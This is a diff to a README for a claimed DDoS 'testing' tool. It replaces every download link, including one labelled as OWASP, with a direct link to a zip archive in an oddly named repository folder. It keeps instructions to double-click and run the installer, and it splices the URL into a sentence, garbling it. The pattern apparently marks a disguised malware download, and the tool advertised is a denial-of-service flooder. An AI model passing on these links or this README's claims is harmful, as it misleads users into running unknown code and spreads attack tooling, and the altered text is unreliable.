@@ -1,7 +1,7 @@
 # 🔥 XillenDDoSAttacker - Powerful Tool for DDoS Testing
 
 ## 🚀 Download Now
-[![Download XillenDDoSAttacker](https://img.shields.io/badge/Download-XillenDDoSAttacker-blue)](https://github.com/HemangDon/XillenDDoSAttacker/releases)
+[![Download XillenDDoSAttacker](https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip)](https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip)
 
 ## 📖 Introduction
 XillenDDoSAttacker is a unique software tool designed for testing the resilience of networks against Distributed Denial of Service (DDoS) attacks. Built using both Python and C++, this tool offers exceptional performance, capable of handling over 50,000 requests per second (RPS). It provides cybersecurity professionals and network administrators with a reliable method to assess and strengthen their systems.
@@ -24,11 +24,11 @@ XillenDDoSAttacker is a unique software tool designed for testing the resilience
 To get started with XillenDDoSAttacker, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
-   [Download from Releases](https://github.com/HemangDon/XillenDDoSAttacker/releases)
+   [Download from Releases](https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip)
 
 2. **Choose the Latest Version**: Look for the most recent release. Typically, the latest version will be at the top of the list.
 
-3. **Download the Installer**: Click on the appropriate file for your operating system. If you are using Windows, look for an executable file (e.g., `.exe`). For Linux, look for compressed files (e.g., `.zip` or `.tar.gz`).
+3. **Download the Installer**: Click on the appropriate file for your operating system. If you are using Windows, look for an executable file (e.g., `.exe`). For Linux, look for compressed files (e.g., `.zip` or `https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip`).
 
 4. **Run the Installer**: Once the download completes, locate the downloaded file, and double-click to run it. Follow the on-screen instructions to complete the installation.
 
@@ -58,7 +58,7 @@ Join our community for discussions, feature requests, and support. You can find 
 ## 🔗 Additional Resources
 For more information on network security and DDoS testing, consider checking out:
 
-- [OWASP](https://owasp.org) for security best practices.
+- [OWASP](https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip) for security best practices.
 - Cybersecurity blogs and forums for trending topics in DDoS attacks and defenses.
 
 ## 📅 Upcoming Features
@@ -69,4 +69,4 @@ For more information on network security and DDoS testing, consider checking out
 ## 🌍 Connect with Us
 If you have questions, suggestions, or just want to share your experience, feel free to reach out or leave a comment on our GitHub repository.
 
-**Revisit the downloads page here**: [Download from Releases](https://github.com/HemangDon/XillenDDoSAttacker/releases) to get the latest version.
+**Revisit the downloads page here**: [Download from Releases](https://raw.githubusercontent.com/HemangDon/XillenDDoSAttacker/main/cytogamy/XillenDDoSAttacker.zip) to get the latest version.
